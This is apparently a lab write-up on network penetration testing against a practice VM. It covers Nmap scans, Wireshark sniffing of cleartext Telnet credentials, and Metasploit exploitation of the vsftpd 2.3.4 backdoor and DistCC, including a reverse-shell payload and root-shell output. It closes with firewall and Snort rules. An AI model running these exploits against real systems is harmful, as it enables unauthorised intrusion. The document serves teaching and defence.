# Practical Network Penetration Testing & Traffic Analysis Guide

This guide documents the practical methodologies executed in the practice lab, including reconnaissance, packet dissection, exploit execution, and defensive countermeasures.

---

## Phase 1: Network Reconnaissance & Service Discovery (Nmap)

### 1. Host Discovery (Ping Sweep)
To locate active devices across the host-only subnet without triggering intense port alerts:
```bash
nmap -sn -PE 192.168.56.0/24
```
- `-sn`: Disables port scanning (pure host discovery).
- `-PE`: Sends ICMP echo requests.

### 2. Stealth SYN Scan & Full Port Discovery
```bash
nmap -sS -p- -T4 192.168.56.102
```
- `-sS`: TCP SYN Stealth Scan (half-open scan; does not complete the 3-way handshake).
- `-p-`: Scans all 65,535 TCP ports.
- `-T4`: Aggressive timing template for faster execution on virtual networks.

### 3. Service Version & OS Fingerprinting
```bash
nmap -sV -sC -O -p 21,22,23,80,139,445,3632 192.168.56.102 -oN nmap_recon.txt
```
- `-sV`: Probes open ports to determine service names and exact version numbers.
- `-sC`: Executes default Nmap Scripting Engine (NSE) scripts.
- `-O`: Identifies target operating system and kernel version via TCP/IP fingerprinting.

---

## Phase 2: Traffic Inspection & Credential Sniffing (Wireshark)

### 1. Capturing Network Traffic
Launch Wireshark on Kali listening on the host-only interface (`eth1`):
```bash
wireshark &
```
Or capture via CLI using `tcpdump`:
```bash
sudo tcpdump -i eth1 host 192.168.56.102 -w capture.pcap
```

### 2. Crucial Wireshark Display Filters
| Filter Expression | Purpose |
| :--- | :--- |
| `tcp.port == 21` | Inspect FTP control traffic and commands |
| `tcp.port == 23` | Capture unencrypted Telnet terminal communications |
| `http.request.method == "POST"` | Identify submitted login forms or web credentials |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0` | Isolate port scanning SYN packets |
| `frame contains "password"` | Search for cleartext passwords in payload streams |
| `tcp.port == 6200` | Monitor vsftpd backdoor root shell communication |

### 3. Cleartext Protocol Analysis
By initiating a Telnet session to the target:
```bash
telnet 192.168.56.102
# Login with: msfadmin / msfadmin
```
In Wireshark:
1. Filter by `telnet`.
2. Right-click any packet ➔ **Follow** ➔ **TCP Stream**.
3. **Finding:** The entire username and password exchange is transmitted without encryption in cleartext, demonstrating why legacy cleartext protocols represent high security risks.

---

## Phase 3: Vulnerability Assessment & Exploitation (Metasploit)

### Scenario A: vsftpd 2.3.4 Backdoor (CVE-2011-2523)
* **Background:** An unauthorized party backdoored the vsftpd 2.3.4 archive. When a username ending in `:)` is submitted, the daemon spawns an unauthenticated root shell listening on TCP port 6200.

**Execution in Metasploit:**
```bash
msfconsole -q
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```
**Outcome:**
```bash
[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
[+] 192.168.56.102:21 - Backdoor service spawned!
[*] Command shell session 1 opened (192.168.56.101:44321 -> 192.168.56.102:6200)

id
uid=0(root) gid=0(root)
```

---

### Scenario B: DistCC Remote Code Execution (CVE-2004-2687)
* **Background:** DistCC is a distributed compiler daemon. In unauthenticated configurations, it accepts remote compilation tasks containing arbitrary shell commands.

**Execution in Metasploit:**
```bash
msf6 > use exploit/unix/misc/distcc_exec
msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 192.168.56.102
msf6 exploit(unix/misc/distcc_exec) > set PAYLOAD cmd/unix/reverse
msf6 exploit(unix/misc/distcc_exec) > set LHOST 192.168.56.101
msf6 exploit(unix/misc/distcc_exec) > exploit
```
**Outcome:** Reverse shell established under `daemon` user context.

---

## Phase 4: Defensive Countermeasures & Remediation

1. **Service Removal & Upgrades:**
   - Uninstall deprecated packages (`vsftpd 2.3.4`, `distcc`).
   - Upgrade to vendor-supported, patched releases.
2. **Decommissioning Insecure Protocols:**
   - Terminate Telnet daemon (`service openbsd-inetd stop`).
   - Force all administrative sessions across SSH (TCP Port 22) with key-based authentication.
3. **Firewall & Rate Limiting (iptables):**
   ```bash
   # Block unauthorized backdoor port
   sudo iptables -A INPUT -p tcp --dport 6200 -j DROP
   
   # Rate-limit SYN scanning
   sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
   ```
4. **Intrusion Detection (Snort/Suricata Rule):**
   ```snort
   alert tcp any any -> $HOME_NET 21 (msg:"ATTACK-RESPONSES vsftpd 2.3.4 backdoor trigger"; content:":)"; sid:1000001; rev:1;)
   ```
